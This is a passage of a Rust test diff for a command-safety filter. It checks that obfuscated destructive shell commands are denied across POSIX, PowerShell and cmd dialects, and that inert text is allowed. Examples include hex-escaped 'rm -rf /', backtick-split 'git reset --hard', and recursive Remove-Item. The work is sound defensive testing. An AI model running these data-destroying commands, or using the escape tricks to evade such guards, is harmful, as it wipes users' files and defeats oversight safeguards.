+            Some("rm-recursive-general")
+        );
+    }
+
+    #[test]
+    fn ansi_c_executable_names_reach_core_and_legacy_packs() {
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+        let cases = [
+            (
+                r"$'\x72\x6d' -rf /",
+                vec!["rm"],
+                vec!["core.filesystem".to_string()],
+                "core.filesystem",
+            ),
+            (
+                r"$'\x64\x6f\x63\x6b\x65\x72' system prune -af",
+                vec!["docker", "prune", "rmi", "volume"],
+                vec!["containers.docker".to_string()],
+                "containers.docker",
+            ),
+            (
+                r"$'\x64\x6f\x63\x6b\x65\x72\0ignored' system prune -af",
+                vec!["docker", "prune", "rmi", "volume"],
+                vec!["containers.docker".to_string()],
+                "containers.docker",
+            ),
+        ];
+
+        for (command, enabled_keywords, ordered_packs, expected_pack) in cases {
+            let keyword_index = REGISTRY.build_enabled_keyword_index(&ordered_packs);
+            for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
+                for index in [None, keyword_index.as_ref()] {
+                    let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                        command,
+                        &enabled_keywords,
+                        &ordered_packs,
+                        index,
+                        &compiled,
+                        &allowlists,
+                        &heredoc_settings,
+                        None,
+                        None,
+                        None,
+                        dialect,
+                    );
+                    assert!(
+                        result.is_denied(),
+                        "ANSI-C executable must be denied for {dialect:?} with index={}: {command}: {:?}",
+                        index.is_some(),
+                        result.pattern_info
+                    );
+                    assert_eq!(
+                        result
+                            .pattern_info
+                            .as_ref()
+                            .and_then(|info| info.pack_id.as_deref()),
+                        Some(expected_pack)
+                    );
+                }
+            }
+        }
+
+        let ordered_packs = ["containers.docker".to_string()];
+        for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                r"echo $'\x64\x6f\x63\x6b\x65\x72 system prune -af'",
+                &["docker", "prune", "rmi", "volume"],
+                &ordered_packs,
+                REGISTRY
+                    .build_enabled_keyword_index(&ordered_packs)
+                    .as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                dialect,
+            );
+            assert!(
+                result.is_allowed(),
+                "ANSI-C argument data must remain inert for {dialect:?}: {:?}",
+                result.pattern_info
+            );
+        }
+    }
+
+    #[test]
+    fn wrangler_semantics_reach_indexed_and_unindexed_evaluator_paths() {
+        let enabled_keywords = ["wrangler"];
+        let ordered_packs = ["cdn.cloudflare_workers".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+        let destructive = [
+            (
+                "wrangler kv --env prod key delete TOKEN --namespace-id=abc",
+                "wrangler-kv-key-delete",
+            ),
+            (
+                "wrangler k'v' k'e'y de'le'te TOKEN --namespace-id=abc",
+                "wrangler-kv-key-delete",
+            ),
+            (
+                "wrangler kv namespace list; npx wrangler --env prod kv namespace delete CACHE",
+                "wrangler-kv-namespace-delete",
+            ),
+            ("bunx --bun wran''gler delete worker", "wrangler-delete"),
+            (
+                "bunx --verbose wran''gler r2 bucket delete assets",
+                "wrangler-r2-bucket-delete",
+            ),
+            ("bun x --bun wran''gler delete worker", "wrangler-delete"),
+            ("bun --bun x wran''gler delete worker", "wrangler-delete"),
+        ];
+        let safe = [
+            "wrangler kv --env prod key get TOKEN --namespace-id=abc",
+            "wrangler k'v' k'e'y g'et' TOKEN --namespace-id=abc",
+        ];
+
+        for index in [None, keyword_index.as_ref()] {
+            for (command, expected_rule) in destructive {
+                let result = evaluate_command_with_pack_order_deadline_at_path(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                );
+                assert!(
+                    result.is_denied(),
+                    "must deny {command:?} with index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+                assert_eq!(
+                    result
+                        .pattern_info
+                        .as_ref()
+                        .and_then(|info| info.pattern_name.as_deref()),
+                    Some(expected_rule)
+                );
+            }
+            for command in safe {
+                let result = evaluate_command_with_pack_order_deadline_at_path(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "must allow {command:?} with index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn unicode_command_words_cannot_panic_or_hide_later_branch_deletion() {
+        let enabled_keywords = ["git"];
+        let ordered_packs = ["core.git".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let config = default_config();
+        let heredoc_settings = config.heredoc_settings();
+
+        for index in [None, keyword_index.as_ref()] {
+            let result = evaluate_command_with_pack_order_deadline_at_path(
+                "éabc; git branch -d no-such-dcg-audit",
+                &enabled_keywords,
+                &ordered_packs,
+                index,
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+            );
+            assert!(
+                result.is_denied(),
+                "later destructive segment must survive a multibyte command word; index={}",
+                index.is_some()
+            );
+            assert_eq!(
+                result
+                    .pattern_info
+                    .as_ref()
+                    .and_then(|info| info.pattern_name.as_deref()),
+                Some("branch-force-delete")
+            );
+        }
+    }
+
+    #[test]
+    fn explicit_shell_dialects_close_core_git_escape_bypasses() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["git"];
+        let ordered_packs = ["core.git".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let config = default_config();
+        let heredoc_settings = config.heredoc_settings();
+
+        let destructive = [
+            (
+                ShellDialect::PowerShell,
+                "g`it branch -`d feature",
+                "branch-force-delete",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& g`it branch --de`lete feature",
+                "branch-force-delete",
+            ),
+            (ShellDialect::PowerShell, "g`it reset --ha`rd", "reset-hard"),
+            (ShellDialect::PowerShell, "git re`set --hard", "reset-hard"),
+            (
+                ShellDialect::PowerShell,
+                "& ('g'+'it') reset --hard",
+                "reset-hard",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& ('C:\\tools\\git.exe') reset --hard",
+                "reset-hard",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& @($G)[0] reset --hard",
+                "reset-hard",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& @('noop', ('g'+'it'))[1] reset --hard",
+                "reset-hard",
+            ),
+            (ShellDialect::PowerShell, "& $G reset --hard", "reset-hard"),
+            (
+                ShellDialect::Cmd,
+                "g^it branch -^d feature",
+                "branch-force-delete",
+            ),
+            (ShellDialect::Cmd, "g^it reset --ha^rd", "reset-hard"),
+            (ShellDialect::Cmd, "%G% reset --hard", "reset-hard"),
+            (
+                ShellDialect::Posix,
+                "git branch $'-d' feature",
+                "branch-force-delete",
+            ),
+            (
+                ShellDialect::Posix,
+                "git branch -$'d' feature",
+                "branch-force-delete",
+            ),
+            (
+                ShellDialect::Posix,
+                "git branch $'--delete' feature",
+                "branch-force-delete",
+            ),
+            (
+                ShellDialect::Posix,
+                "git branch --$'delete' feature",
+                "branch-force-delete",
+            ),
+            (ShellDialect::Posix, "g$'i't reset --hard", "reset-hard"),
+            (
+                ShellDialect::Posix,
+                "PART=i; g${PART}t reset --hard",
+                "reset-hard",
+            ),
+            (
+                ShellDialect::Posix,
+                "git branch $\"-d\" feature",
+                "branch-force-delete",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output @'\nit's inert data\n'@; git branch -d feature",
+                "branch-force-delete",
+            ),
+        ];
+        let safe = [
+            (ShellDialect::PowerShell, "g`it branch --format -`d"),
+            (ShellDialect::Cmd, "g^it branch --format -^d"),
+            (
+                ShellDialect::Posix,
+                r#"git commit -m "Fix git push --force detection""#,
+            ),
+            (
+                ShellDialect::PowerShell,
+                r#"git commit -m "Fix git push --force detection""#,
+            ),
+            (
+                ShellDialect::Cmd,
+                r#"git commit -m "Fix git push --force detection""#,
+            ),
+            (
+                ShellDialect::Posix,
+                r#"g$'i't commit -m "Fix git reset --hard detection""#,
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& ('g'+'it') commit -m 'Fix git reset --hard detection'",
+            ),
+            (
+                ShellDialect::Cmd,
+                r#"%G% commit -m "Fix git reset --hard detection""#,
+            ),
+            (
+                ShellDialect::Posix,
+                r#"g${PART}t commit -m "Fix git reset --hard detection""#,
+            ),
+            (ShellDialect::PowerShell, "'g`it' branch -d feature"),
+            (ShellDialect::Cmd, "\"g^it\" branch -d feature"),
+            (ShellDialect::Unknown, "g`it branch -`d feature"),
+            (ShellDialect::Unknown, "g^it branch -^d feature"),
+            (ShellDialect::PowerShell, "& ('g'+'it') status"),
+            (ShellDialect::PowerShell, "& $G status"),
+            (ShellDialect::PowerShell, "& ('rm') reset --hard"),
+            (ShellDialect::PowerShell, "& @('rm')[0] reset --hard"),
+            (
+                ShellDialect::PowerShell,
+                "& ('Write'+'-Output') 'git reset --hard'",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& ('Write'+'-Output') 'git -c alias.x=!rm -r ./tree x'",
+            ),
+            (ShellDialect::Cmd, "%G% status"),
+            (ShellDialect::Posix, "PART=i; g${PART}t status"),
+        ];
+
+        for index in [None, keyword_index.as_ref()] {
+            for (dialect, command, expected_rule) in destructive {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_denied(),
+                    "must deny {command:?} for {dialect:?}; index={}",
+                    index.is_some()
+                );
+                let info = result.pattern_info.expect("dialect denial metadata");
+                assert_eq!(info.pack_id.as_deref(), Some("core.git"));
+                assert_eq!(info.pattern_name.as_deref(), Some(expected_rule));
+                assert!(
+                    info.matched_span.is_none(),
+                    "decoded matches must not invent raw byte spans"
+                );
+            }
+
+            for (dialect, command) in safe {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "must allow {command:?} for {dialect:?}; index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn explicit_windows_dialects_close_windows_filesystem_escape_bypasses() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = [
+            "del",
+            "erase",
+            "rd",
+            "rmdir",
+            "format",
+            "Remove-Item",
+            "ri",
+            "rm",
+            "Clear-Content",
+            "Clear-RecycleBin",
+        ];
+        let ordered_packs = ["windows.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        let destructive = [
+            (ShellDialect::Cmd, r"r^d /s /q C:\src", "rd-recursive"),
+            (ShellDialect::Cmd, r"d^el /s /q C:\src\*", "del-recursive"),
+            (ShellDialect::Cmd, r"f^ormat X: /Q /Y", "format-drive"),
+            (
+                ShellDialect::PowerShell,
+                r"Clear`-Content C:\important.conf",
+                "clear-content",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Clear`-RecycleBin -Force",
+                "clear-recyclebin",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"Remove`-Item -Recurse -Force C:\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"Remove-Item -Recurse C:\src",
+                "remove-item-recurse",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"ri -R C:\src",
+                "remove-item-recurse",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"Remove-Item -Recurse -LiteralPath -foo",
+                "remove-item-recurse",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r#"& "Remove-Item" -Recurse C:\src"#,
+                "remove-item-recurse",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"& 'ri' -R C:\src",
+                "remove-item-recurse",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"& ('Clear' + '-Content') C:\important.conf",
+                "clear-content",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"Set-Alias zap Clear-Content; zap C:\important.conf",
+                "clear-content",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"New-Alias wipe Remove-Item; wipe -Recurse -Force C:\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output @'\nit's inert data\n'@; Clear-Content C:\\important.conf",
+                "clear-content",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Remove-Item –Recurse –Force C:\\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Remove-Item —Rec:$true —Fo:$true C:\\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Remove-Item ―R: $true ―For: $true C:\\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"ReMoVe-ItEm -Recurse -Force C:\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"rM -R -Fo C:\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"cLeAr-CoNtEnT C:\important.conf",
+                "clear-content",
+            ),
+            (
+                ShellDialect::Unknown,
+                r"ReMoVe-ItEm -Recurse -Force C:\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::Unknown,
+                r"rM -R -Fo C:\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::Unknown,
+                r"cLeAr-CoNtEnT C:\important.conf",
+                "clear-content",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "New-Alias wipe Remove-Item; wipe `\r\n -Recurse -Force C:\\src",
+                "remove-item-recurse-force",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$sb = [ScriptBlock]::Create('Remove-Item -Recurse -Force C:\\src'); & `\r\n $sb",
+                "remove-item-recurse-force",
+            ),
+        ];
+        let safe = [
+            (ShellDialect::Cmd, r"r^d /?"),
+            (ShellDialect::Cmd, r"echo r^d /s /q C:\src"),
+            (
+                ShellDialect::PowerShell,
+                r"Clear`-Content C:\important.conf -WhatIf",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"Remove-Item -Recurse C:\src -WhatIf",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"Remove-Item -Recurse -NotAParameter C:\src",
+            ),
+            (ShellDialect::PowerShell, r"ri -R C:\src -WhatIf"),
+            (
+                ShellDialect::PowerShell,
+                r#"& "Remove-Item" -Recurse C:\src -WhatIf"#,
+            ),
+            (ShellDialect::PowerShell, r"& 'ri' -R C:\src -WhatIf"),
+            (
+                ShellDialect::PowerShell,
+                r"Write-Output 'Clear`-Content C:\important.conf'",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"& ('Write'+'-Output') 'Clear-Content C:\important.conf'",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"& @('Write-Output')[0] 'Clear-Content C:\important.conf'",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"Set-Alias out Write-Output; out 'Clear-Content C:\important.conf'",
+            ),
+            (
+                ShellDialect::PowerShell,
+                r"Write-Output 'ReMoVe-ItEm -Recurse -Force C:\src'",
+            ),
+            (
+                ShellDialect::Unknown,
+                r"Write-Output 'cLeAr-CoNtEnT C:\important.conf'",
+            ),
+        ];
+
+        for index in [None, keyword_index.as_ref()] {
+            for (dialect, command, expected_rule) in destructive {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_denied(),
+                    "must deny escaped Windows filesystem command {command:?} for {dialect:?}; index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+                assert_eq!(
+                    result
+                        .pattern_info
+                        .as_ref()
+                        .and_then(|info| info.pattern_name.as_deref()),
+                    Some(expected_rule),
+                    "wrong rule for {command:?}; index={}",
+                    index.is_some()
+                );
+            }
+            for (dialect, command) in safe {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "must allow harmless escaped Windows filesystem data {command:?} for {dialect:?}; index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn posix_substitutions_are_evaluated_as_syntax_and_nested_commands() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["git", "rm"];
+        let ordered_packs = ["core.git".to_string(), "core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        for command in [
+            "g$(printf it) br$(printf anch) -$(printf d) feature",
+            "g`printf it` branch -`printf d` feature",
+            "g$(printf it) re$(printf set) --ha$(printf rd)",
+            "git branch --format $(producer)",
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::Posix,
+            );
+            assert!(
+                result.is_denied(),
+                "substitution must not hide destructive Git syntax: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        let nested = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+            "git branch --format \"$(rm -r /home/dcg-substitution-test)\"",
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+            ShellDialect::Posix,
+        );
+        assert!(nested.is_denied());
+        assert_eq!(
+            nested
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pattern_name.as_deref()),
+            Some("rm-recursive-root-home")
+        );
+
+        for command in [
+            "echo \"$(printf 'git reset --hard')\"",
+            "git branch --format $(printf %s -d)",
+            "git branch --format \"$(printf %s -d)\"",
+            "git branch --format \"$(producer)\"",
+            "git branch --format \"$(printf 'rm -r /home')\"",
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::Posix,
+            );
+            assert!(
+                result.is_allowed(),
+                "substitution used only as inert data must remain allowed: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+    }
+
+    #[test]
+    fn checked_substitution_and_assignment_data_flow_is_role_aware() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["git", "rm", "bash", "sh", "eval"];
+        let ordered_packs = ["core.git".to_string(), "core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
+            for command in [
+                "$(echo hello)",
+                "`echo pwd`",
+                "echo \"rm -rf / $(echo safe)\"",
+                "VAR='rm -rf /'; echo \"$VAR\"",
+                "VAR='git reset --hard'; command echo \"$VAR\"",
+            ] {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    keyword_index.as_ref(),
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "statically checked data flow must remain allowed for {dialect:?}: {command}: {:?}",
+                    result.pattern_info
+                );
+            }
+
+            for command in [
+                "$(echo bash) -c 'git reset --hard'",
+                "$(echo git) reset --hard",
+                "VAR='rm -rf /'; eval \"$VAR\"",
+                "VAR='rm -rf /'; echo \"$VAR\" | sh",
+                "echo \"$(printf 'git reset --hard')\" | sh",
+            ] {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    keyword_index.as_ref(),
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_denied(),
+                    "executable data flow must remain denied for {dialect:?}: {command}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn dollar_substitutions_execute_under_powershell_and_unknown_dialects() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["git", "rm"];
+        let ordered_packs = ["core.git".to_string(), "core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        for (dialect, command, expected_rule) in [
+            (
+                ShellDialect::Unknown,
+                "echo $(rm -r ./tree)",
+                "rm-recursive-general",
+            ),
+            (
+                ShellDialect::Unknown,
+                "echo '<# harmless #>' $(rm -r ./tree)",
+                "rm-recursive-general",
+            ),
+            (
+                ShellDialect::Posix,
+                "echo \"$(printf ok # ) comment\n rm -r ./tree)\"",
+                "rm-recursive-general",
+            ),
+            (
+                ShellDialect::Posix,
+                "echo \"$( (printf ok); rm -r ./tree)\"",
+                "rm-recursive-general",
+            ),
+            (
+                ShellDialect::Posix,
+                "echo \"$(printf %s \"$(rm -r ./tree)\")\"",
+                "rm-recursive-general",
+            ),
+            (
+                ShellDialect::Posix,
+                "echo `echo \\`rm -r ./tree\\``",
+                "rm-recursive-general",
+            ),
+            (
+                ShellDialect::Posix,
+                "echo \"$(case x in x) rm -r ./tree;; esac)\"",
+                "rm-recursive-general",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output $(rm -r ./tree)",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output $(g`it branch -`d feature)",
+                "branch-force-delete",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output $(<# ) #> rm -r ./tree)",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output $(Write-Output foo#bar; rm -r ./tree)",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output @\"\n$(rm -r ./tree)\n\"@",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output @\"\u{00a0}\n$(rm -r ./tree)\n\"@",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& $({ rm -r ./tree })",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                ". ($({ rm -r ./tree }))",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output $({ rm -r ./tree })",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$({ rm -r ./tree }).Invoke()",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Invoke-Command -ScriptBlock $({ rm -r ./tree })",
+                "powershell-remove-item-recursive",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "1 | ForEach-Object $({ rm -r ./tree })",
+                "powershell-remove-item-recursive",
+            ),
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                dialect,
+            );
+            assert!(
+                result.is_denied(),
+                "substitution must execute for {dialect:?}: {command}: {:?}",
+                result.pattern_info
+            );
+            assert_eq!(
+                result
+                    .pattern_info
+                    .as_ref()
+                    .and_then(|info| info.pattern_name.as_deref()),
+                Some(expected_rule)
+            );
+            assert!(
+                result
+                    .pattern_info
+                    .as_ref()
+                    .is_some_and(|info| info.matched_span.is_none())
+            );
+        }
+
+        for (dialect, command) in [
+            (ShellDialect::Unknown, "echo '$(rm -r ./tree)'"),
+            (ShellDialect::Posix, "echo ok # $(rm -r ./tree)"),
+            (ShellDialect::Unknown, "echo ok # $(rm -r ./tree)"),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output ok # $(rm -r ./tree)",
+            ),
+            (
+                ShellDialect::Unknown,
+                "Write-Output ok <# $(rm -r ./tree) #>",
+            ),
+            (ShellDialect::Posix, "cat <<'EOF'\n$(rm -r ./tree)\nEOF"),
+            (ShellDialect::Unknown, "cat <<'EOF'\n$(rm -r ./tree)\nEOF"),
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                dialect,
+            );
+            assert!(
+                result.is_allowed(),
+                "literal substitution data must remain safe for {dialect:?}: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        for (dialect, command) in [
+            (ShellDialect::Posix, "cat <<EOF\n$(rm -r ./tree)\nEOF"),
+            (ShellDialect::Unknown, "cat <<EOF\n$(rm -r ./tree)\nEOF"),
+            (ShellDialect::Posix, "bash <<'EOF'\n$(rm -r ./tree)\nEOF"),
+            (
+                ShellDialect::Posix,
+                "eval 'cat(){ bash -s; }'; cat <<'EOF'\n$(rm -r ./tree)\nEOF",
+            ),
+            (
+                ShellDialect::Posix,
+                "source ./redefine-cat.sh; cat <<'EOF'\n$(rm -r ./tree)\nEOF",
+            ),
+            (
+                ShellDialect::Posix,
+                ". ./redefine-cat.sh; cat <<'EOF'\n$(rm -r ./tree)\nEOF",
+            ),
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                dialect,
+            );
+            assert!(
+                result.is_denied(),
+                "expanding or executing heredoc body must remain blocked for {dialect:?}: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        // Static strings and here-strings can flow into `&`, dot-sourcing,
+        // `Invoke-Expression`, or another execution sink. Without full
+        // PowerShell data-flow proof, retaining their destructive text for the
+        // ordinary pack pass is the sound conservative decision.
+        for command in [
+            "Write-Output $('rm -r ./tree')",
+            "Write-Output @'\n$(rm -r ./tree)\n'@",
+            "Write-Output @'\u{00a0}\n$(rm -r ./tree)\n'@",
+            "Write-Output @'\nit's literal $(rm -r ./tree)\n'@; Write-Output END",
+            "Write-Output @'\nit's literal $(rm -r ./tree)\n'@ | Write-Output",
+            "Write-Output @'\nit's literal $(rm -r ./tree)\n'@, 'tail'",
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::PowerShell,
+            );
+            assert!(
+                result.is_denied(),
+                "PowerShell string values with destructive content must fail closed without consumer data-flow proof: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        let standalone_literal = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+            "@'\n$(rm -r ./tree)\n'@",
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+            ShellDialect::PowerShell,
+        );
+        assert!(
+            standalone_literal.is_allowed(),
+            "a standalone verbatim here-string is an inert value: {:?}",
+            standalone_literal.pattern_info
+        );
+
+        for command in [
+            "Write-Output $($x = 1 +# ) comment\n rm -r ./tree)",
+            "Write-Output $(1, # ) comment\n rm -r ./tree)",
+        ] {
+            let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                command,
+                &enabled_keywords,
+                &ordered_packs,
+                keyword_index.as_ref(),
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                ShellDialect::PowerShell,
+            );
+            assert!(
+                result.is_denied(),
+                "PowerShell comment syntax must never hide a destructive substitution: {command}: {:?}",
+                result.pattern_info
+            );
+        }
+    }
+
+    #[test]
+    fn full_command_allowlists_authorize_outer_envelopes_before_nested_evaluation() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["rm"];
+        let ordered_packs = ["core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let heredoc_settings = default_config().heredoc_settings();
